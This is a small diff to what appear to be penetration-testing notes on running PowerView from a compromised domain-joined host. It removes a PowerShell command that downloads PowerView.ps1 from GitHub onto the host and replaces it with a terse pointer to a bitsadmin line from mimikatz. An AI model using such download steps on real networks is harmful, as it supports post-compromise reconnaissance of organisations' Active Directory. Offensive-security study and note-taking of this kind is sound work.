@@ -7,7 +7,7 @@ PowerView is ran internally from a compromised Domain joined host:\
 - Or from Domain joined host PowerShell
 
 ```
-(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+USE bitsadmin line from mimikatz
 ```
 
 
